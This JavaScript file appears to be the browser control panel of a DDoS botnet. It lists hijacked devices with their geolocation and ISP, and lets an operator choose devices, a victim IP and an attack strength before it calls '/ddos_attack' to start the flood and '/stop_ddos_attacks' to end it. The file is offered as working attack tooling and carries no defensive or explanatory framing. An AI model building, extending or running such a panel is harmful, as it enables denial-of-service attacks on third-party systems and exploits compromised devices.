async function main() {
    const devices = JSON.parse(await getUrl('/list_devices'));

    for(const device of devices)
        await createDevice(device);
    
    document.querySelector('#attack-strength').addEventListener('change', e => {
        document.querySelector('.strength-label').innerHTML = `attack strength(${e.target.value})`;
    });

    document.querySelector('.begin-attack').addEventListener('click', async() => {
        const strength = document.querySelector('#attack-strength').value;
        const victim_ip = document.querySelector('.victim-ip').value;
        const elements = document.querySelectorAll('.select-device');
        const devices = [];
        for(const element of elements) {
            if(element.checked)
                devices.push(element.value);
        }

        if(devices.length === 0 || victim_ip.length === 0)
            return;
            await getUrl(`/ddos_attack?strength=${strength}&victim=${victim_ip}&devices=${devices.join('+')}`);
    });

    document.querySelector('.stop-attack').addEventListener('click', async() => {
        await getUrl('/stop_ddos_attacks');
    });
}
main();

async function createDevice(device) {
    const info = await dnsLookup(device);
    
    const wrapper = document.querySelector('.wrapper');
    const select = document.createElement('input');
    const container = document.createElement('div');
    const image = document.createElement('img');
    const title = document.createElement('span');
    const location = document.createElement('span');
    const isp = document.createElement('span');

    select.setAttribute('class', 'select-device');
    container.setAttribute('class', 'device');
    image.setAttribute('class', 'image');
    title.setAttribute('class', 'title');
    location.setAttribute('class', 'location');
    isp.setAttribute('class', 'isp');

    select.type = 'checkbox';
    select.value = device;
    image.src = './assets/images/device_icon.png';
    title.innerText = device;
    location.innerText = `${info['country']}, ${info['city']}`;
    isp.innerText = info['isp'];

    container.appendChild(select);
    container.appendChild(image);
    container.appendChild(title);
    container.appendChild(location);
    container.appendChild(isp);
    wrapper.appendChild(container);
    return 0;
}

async function dnsLookup(device) {
    const [public_ip, private_ip] = device.split('>')
    const info = JSON.parse(await getUrl(`/iplookup?ip=${public_ip}`));
    return info;
}

async function getUrl(url) {
    return new Promise((resolve, reject) => {
        const req = new XMLHttpRequest();
        req.onreadystatechange = e => {
            if(req.readyState === 4 && req.status === 200)
                resolve(req.responseText);
        }
        req.open('GET', url, true);
        req.send();
    });
}

function parseCookies(cookies) {
    let result = {}
    const items = cookies.split(';');

    for(const item of items) {
        const [ key, value ] = item.replace(/"/g, '\'').split('='); //replace " with ', to avoid errors
        Object.assign(result, JSON.parse(`{
            "${key}": "${value}"
        }`));
    }

    return result;
}